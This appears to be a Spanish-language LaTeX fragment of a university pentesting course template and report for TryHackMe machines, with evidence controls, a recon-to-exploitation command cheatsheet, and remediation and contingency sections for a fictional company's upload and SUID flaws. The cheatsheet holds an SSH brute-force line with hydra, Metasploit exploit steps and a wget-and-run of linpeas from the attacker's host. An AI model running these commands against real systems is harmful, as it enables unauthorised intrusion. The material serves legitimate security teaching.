\begin{control}[Bitácora de comandos]
Exportá únicamente los comandos relevantes de tu sesión de Kali al finalizar cada clase. Revisá el archivo y eliminá contraseñas, tokens, claves privadas y cualquier dato personal antes de subirlo:
\begin{lstlisting}[language=bash]

\end{lstlisting}
Este archivo forma parte de los anexos del informe y demuestra el proceso real. La bitácora no reemplaza la revisión manual de secretos.
\end{control}

\begin{control}[Evidencias con marca de identidad]
Cada captura de pantalla crítica debe incluir visible:
\begin{itemize}[leftmargin=*]
  \item El username de THM en la interfaz de la plataforma.
  \item La fecha y hora del sistema (visible en la barra de Kali).
  \item La IP de la máquina objetivo.
\end{itemize}
\end{control}

\begin{control}[Hash de las flags]
En lugar de publicar las flags completas (que circulan en writeups), incluí en el informe el \textbf{hash SHA-256} de cada flag obtenida. Así el docente puede verificar que la tenés sin que quede expuesta.
\begin{lstlisting}[language=bash]
echo -n "thm{flag_obtenida}" | sha256sum
\end{lstlisting}
\end{control}

\begin{control}[Commits firmados]
Usá commits con tu identidad institucional, configurada solo en este repositorio:
\begin{lstlisting}[language=bash]
git config user.name "Tu Nombre Completo"

\subsection{Comandos base por fase (cheatsheet)}

\begin{lstlisting}[language=bash]
# RECONOCIMIENTO Y ESCANEO
nmap -sC -sV -oN bitacora/nmap_inicial.txt <IP_OBJETIVO>
nmap -p- --min-rate 5000 -oN bitacora/nmap_puertos.txt <IP_OBJETIVO>

# ENUMERACION WEB
gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt \
  -o bitacora/gobuster.txt
nikto -h http://<IP_OBJETIVO> -o bitacora/nikto.txt

# ANALISIS DE TRAFICO
wireshark  # GUI
tcpdump -i tun0 -w bitacora/captura_$(date +%H%M).pcap

# AUTENTICACION (solo si la sala lo autoriza y con limites)
# Preferi validar primero usuarios y politicas; documenta el alcance.
hydra -l usuario -P /usr/share/wordlists/rockyou.txt <IP> ssh -t 4 -f

# EXPLOTACION CON METASPLOIT (solo contra la IP asignada por THM)
msfconsole
search <servicio>
use <exploit>
set RHOSTS <IP>
set LHOST tun0
exploit

# POST-EXPLOTACION LINUX (solo si la sala lo requiere)
wget http://<tu-IP>:8000/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh > bitacora/linpeas.txt
\end{lstlisting}

\subsection{Checklist de resolución}
Para cada máquina, recorrela en este orden:

\begin{enumerate}[leftmargin=*]
  \item \textbf{Ping} a la IP objetivo (confirmar que está viva).
  \item \textbf{Nmap} completo (todos los puertos + detección de servicios y versiones).
  \item \textbf{Nikto} + \textbf{Gobuster} si hay web.
  \item Anotar en la bitácora cada puerto, servicio y versión.
  \item Buscar vulnerabilidades públicas para cada versión detectada (\texttt{searchsploit}, Google, CVE Details).
  \item Probar exploits en orden de criticidad.
  \item Al obtener shell, ejecutar \texttt{whoami}, \texttt{uname -a}, \texttt{sudo -l}.
  \item Escalar privilegios (LinPEAS / WinPEAS).
  \item Documentar cada hallazgo con captura + comando + evidencia.
\end{enumerate}

1. Validar el contenido real de los archivos subidos (magic bytes/MIME), no solo la extensión, y aplicar lista blanca estricta de tipos permitidos (prioridad: Alta, asociado a H-01).\\ 2. Servir el directorio de uploads sin permisos de ejecución de scripts.\\ 3. Eliminar el bit SUID de /bin/systemctl (chmod u-s /bin/systemctl), ya que no es necesario para su funcionamiento normal (prioridad: Crítica, asociado a H-02).\\ 4. Auditar periódicamente el sistema en busca de binarios SUID no estándar.\\\vspace{0.5cm}
\end{campo}

\begin{campo}[Recomendaciones administrativas (políticas y procesos)]
\textit{Políticas, capacitaciones, revisiones periódicas, etc.}
1. Establecer una política de revisión periódica de permisos y binarios SUID en servidores productivos.\\ 2. Capacitar al equipo de desarrollo en prácticas seguras de carga de archivos (OWASP Secure File Upload).\\ 3. Incorporar pruebas de pentesting como parte del ciclo de despliegue antes de pasar a producción.\\\vspace{0.5cm}
\end{campo}

\section{PARTE III: PROTOCOLO DE CONTINGENCIA}

\begin{campo}[Escenario de falla]
\textit{Describí qué procedimiento realizado podría fallar o causar una interrupción del servicio en producción.}
La aplicación del parche de validación de archivos subidos (H-01) en producción, sin un ambiente de pruebas previo, podría romper una integración legítima que dependa del endpoint de carga actual. Asimismo, la remoción del bit SUID de /bin/systemctl (H-02) podría afectar scripts de administración que dependan de ese permiso elevado para gestionar servicios sin sudo.\\\vspace{0.5cm}
\end{campo}

\begin{campo}[Impacto sobre la continuidad del negocio]
\textit{¿Qué procesos de INSECUR S.A. se verían afectados? ¿Por cuánto tiempo?}
Se vería afectado el servicio web de carga de archivos de INSECUR S.A., interrumpiendo la disponibilidad del formulario de subida durante la ventana de aplicación del parche (estimado entre 15 y 30 minutos). Los procesos administrativos que dependan de systemctl con privilegios elevados podrían requerir ajuste manual tras el cambio de permisos.\\\vspace{0.5cm}
\end{campo}

\begin{campo}[Plan de respuesta]
\begin{enumerate}
  \item \textbf{Activación:} Se detecta mediante monitoreo del servicio web (caída de disponibilidad del endpoint de carga) o fallo reportado por usuarios administrativos al ejecutar comandos systemctl sin privilegios.
  \item \textbf{Contención:} Revertir el cambio de configuración aplicado (restaurar permisos previos de systemctl o deshabilitar temporalmente la validación estricta de uploads) para restablecer el servicio mientras se analiza la causa.
  \item \textbf{Recuperación:} Rollback a la configuración anterior mediante backup de los archivos de configuración del servidor web, tomado antes de aplicar el parche.
  \item \textbf{Comunicación:} Se notifica al equipo de infraestructura de INSECUR S.A. y, de ser necesario, a los usuarios afectados sobre la interrupción temporal del servicio.
  \item \textbf{Post-mortem:} Se documenta el incidente en la bitácora del equipo, detallando causa raíz, tiempo de resolución y ajustes al procedimiento de despliegue para futuras aplicaciones de parches.
\end{enumerate}
\vspace{2cm}
\end{campo}

\begin{campo}[RTO y RPO estimados]
\textbf{RTO} (Recovery Time Objective): 30 minutos \\
\textbf{RPO} (Recovery Point Objective): 0 minutos (sin pérdida de datos, solo configuración)
\end{campo}
